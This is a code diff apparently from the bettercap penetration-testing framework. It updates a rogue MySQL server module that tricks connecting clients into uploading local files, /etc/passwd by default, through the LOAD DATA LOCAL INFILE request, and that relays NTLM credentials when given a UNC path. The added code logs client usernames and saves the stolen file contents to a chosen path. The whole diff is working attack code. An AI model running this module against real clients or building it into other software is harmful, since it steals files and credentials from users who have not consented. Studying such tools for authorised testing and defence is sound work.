@@ -4,10 +4,13 @@ import (
 	"bufio"
 	"bytes"
 	"fmt"
+	"io/ioutil"
 	"net"
 	"strings"
 
+	"github.com/bettercap/bettercap/core"
 	"github.com/bettercap/bettercap/log"
+	"github.com/bettercap/bettercap/packets"
 	"github.com/bettercap/bettercap/session"
 )
 
@@ -16,6 +19,7 @@ type MySQLServer struct {
 	address  *net.TCPAddr
 	listener *net.TCPListener
 	infile   string
+	outfile  string
 }
 
 func NewMySQLServer(s *session.Session) *MySQLServer {
@@ -23,10 +27,16 @@ func NewMySQLServer(s *session.Session) *MySQLServer {
 	mysql := &MySQLServer{
 		SessionModule: session.NewSessionModule("mysql.server", s),
 	}
+
 	mysql.AddParam(session.NewStringParameter("mysql.server.infile",
 		"/etc/passwd",
 		"",
 		"File you want to read. UNC paths are also supported."))
+
+	mysql.AddParam(session.NewStringParameter("mysql.server.outfile",
+		"",
+		"",
+		"If filled, the INFILE buffer will be saved to this path instead of being logged."))
 
 	mysql.AddParam(session.NewStringParameter("mysql.server.address",
 		session.ParamIfaceAddress,
@@ -73,6 +83,8 @@ func (mysql *MySQLServer) Configure() error {
 		return session.ErrAlreadyStarted
 	} else if err, mysql.infile = mysql.StringParam("mysql.server.infile"); err != nil {
 		return err
+	} else if err, mysql.outfile = mysql.StringParam("mysql.server.outfile"); err != nil {
+		return err
 	} else if err, address = mysql.StringParam("mysql.server.address"); err != nil {
 		return err
 	} else if err, port = mysql.IntParam("mysql.server.port"); err != nil {
@@ -91,92 +103,75 @@ func (mysql *MySQLServer) Start() error {
 	}
 
 	return mysql.SetRunning(true, func() {
-		log.Info("MySQL server starting on IP %s", mysql.address)
-
-		MySQLGreeting := []byte{
-			0x5b, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x36,
-			0x2e, 0x32, 0x38, 0x2d, 0x30, 0x75, 0x62, 0x75,
-			0x6e, 0x74, 0x75, 0x30, 0x2e, 0x31, 0x34, 0x2e,
-			0x30, 0x34, 0x2e, 0x31, 0x00, 0x2d, 0x00, 0x00,
-			0x00, 0x40, 0x3f, 0x59, 0x26, 0x4b, 0x2b, 0x34,
-			0x60, 0x00, 0xff, 0xf7, 0x08, 0x02, 0x00, 0x7f,
-			0x80, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-			0x00, 0x00, 0x00, 0x00, 0x68, 0x69, 0x59, 0x5f,
-			0x52, 0x5f, 0x63, 0x55, 0x60, 0x64, 0x53, 0x52,
-			0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e,
-			0x61, 0x74, 0x69, 0x76, 0x65, 0x5f, 0x70, 0x61,
-			0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00,
-		}
-		FirstResponseOK := []byte{
-			0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02,
-			0x00, 0x00, 0x00,
-		}
-
-		FileNameLength := byte(len(mysql.infile) + 1)
-		GetFile := []byte{
-			FileNameLength, 0x00, 0x00, 0x01, 0xfb,
-		}
-		GetFile = append(GetFile, mysql.infile...)
-
-		SecondResponseOK := []byte{
-			0x07, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02,
-			0x00, 0x00, 0x00,
-		}
-
+		log.Info("[%s] server starting on address %s", core.Green("mysql.server"), mysql.address)
 		for mysql.Running() {
-
-			// tcp listener
-			conn, err := mysql.listener.AcceptTCP()
-			if err != nil {
-				log.Warning("Error while accepting TCP connection: %s", err)
+			if conn, err := mysql.listener.AcceptTCP(); err != nil {
+				log.Warning("[%s] error while accepting tcp connection: %s", core.Green("mysql.server"), err)
 				continue
-			}
+			} else {
+				defer conn.Close()
 
-			// send the mysql greeting
-			conn.Write([]byte(MySQLGreeting))
+				// TODO: include binary support and files > 16kb
+				clientAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
+				readBuffer := make([]byte, 16384)
+				reader := bufio.NewReader(conn)
+				read := 0
 
-			// read the incoming responses and retrieve infile
-			// TODO: include binary support and files > 16kb
-			b := make([]byte, 16384)
-			bufio.NewReader(conn).Read(b)
+				log.Info("[%s] connection from %s", core.Green("mysql.server"), clientAddress)
 
-			// parse client capabilities and validate connection
-			// TODO: parse mysql connections properly and
-			//       display additional connection attributes
-			clientCapabilities := fmt.Sprintf("%08b", (int(uint32(b[4]) | uint32(b[5])<<8)))
-			if len(clientCapabilities) == 16 {
-				remoteAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
-				log.Info("MySQL connection from: %s", remoteAddress)
-				loadData := string(clientCapabilities[8])
-				log.Info("Can Use LOAD DATA LOCAL: %s", loadData)
-				username := bytes.Split(b[36:], []byte{0})[0]
-				log.Info("MySQL Login Request Username: %s", username)
-
-				// send initial responseOK
-				conn.Write([]byte(FirstResponseOK))
-				bufio.NewReader(conn).Read(b)
-				conn.Write([]byte(GetFile))
-				infileLen, err := bufio.NewReader(conn).Read(b)
-				if err != nil {
-					log.Warning("Error while reading buffer: %s", err)
+				if _, err := conn.Write(packets.MySQLGreeting); err != nil {
+					log.Warning("[%s] error while writing server greeting: %s", core.Green("mysql.server"), err)
+					continue
+				} else if read, err = reader.Read(readBuffer); err != nil {
+					log.Warning("[%s] error while reading client message: %s", core.Green("mysql.server"), err)
 					continue
 				}
 
-				// check if the infile is an UNC path
-				if strings.HasPrefix(mysql.infile, "\\") {
-					log.Info("NTLM from '%s' relayed to %s", remoteAddress, mysql.infile)
-				} else {
-					// print the infile content, ignore mysql protocol headers
-					// TODO: include binary support and output to a file
-					log.Info("Retrieving '%s' from %s (%d bytes)\n%s", mysql.infile, remoteAddress, infileLen-9, string(b)[4:infileLen-4])
+				// parse client capabilities and validate connection
+				// TODO: parse mysql connections properly and
+				//       display additional connection attributes
+				capabilities := fmt.Sprintf("%08b", (int(uint32(readBuffer[4]) | uint32(readBuffer[5])<<8)))
+				loadData := string(capabilities[8])
+				username := string(bytes.Split(readBuffer[36:], []byte{0})[0])
+
+				log.Info("[%s] can use LOAD DATA LOCAL: %s", core.Green("mysql.server"), loadData)
+				log.Info("[%s] login request username: %s", core.Green("mysql.server"), core.Bold(username))
+
+				if _, err := conn.Write(packets.MySQLFirstResponseOK); err != nil {
+					log.Warning("[%s] error while writing server first response ok: %s", core.Green("mysql.server"), err)
+					continue
+				} else if _, err := reader.Read(readBuffer); err != nil {
+					log.Warning("[%s] error while reading client message: %s", core.Green("mysql.server"), err)
+					continue
+				} else if _, err := conn.Write(packets.MySQLGetFile(mysql.infile)); err != nil {
+					log.Warning("[%s] error while writing server get file request: %s", core.Green("mysql.server"), err)
+					continue
+				} else if read, err = reader.Read(readBuffer); err != nil {
+					log.Warning("[%s] error while readind buffer: %s", core.Green("mysql.server"), err)
+					continue
 				}
 
-				// send additional response
-				conn.Write([]byte(SecondResponseOK))
-				bufio.NewReader(conn).Read(b)
+				if strings.HasPrefix(mysql.infile, "\\") {
+					log.Info("[%s] NTLM from '%s' relayed to %s", core.Green("mysql.server"), clientAddress, mysql.infile)
+				} else if fileSize := read - 9; fileSize < 4 {
+					log.Warning("[%s] unpexpected buffer size %d", core.Green("mysql.server"), read)
+				} else {
+					log.Info("[%s] read file ( %s ) is %d bytes", core.Green("mysql.server"), mysql.infile, fileSize)
 
+					fileData := readBuffer[4 : read-4]
+
+					if mysql.outfile == "" {
+						log.Info("\n%s", string(fileData))
+					} else {
+						log.Info("[%s] saving to %s ...", core.Green("mysql.server"), mysql.outfile)
+						if err := ioutil.WriteFile(mysql.outfile, fileData, 0755); err != nil {
+							log.Warning("[%s] error while saving the file: %s", core.Green("mysql.server"), err)
+						}
+					}
+				}
+
+				conn.Write(packets.MySQLSecondResponseOK)
 			}
-			defer conn.Close()
 		}
 	})
 }
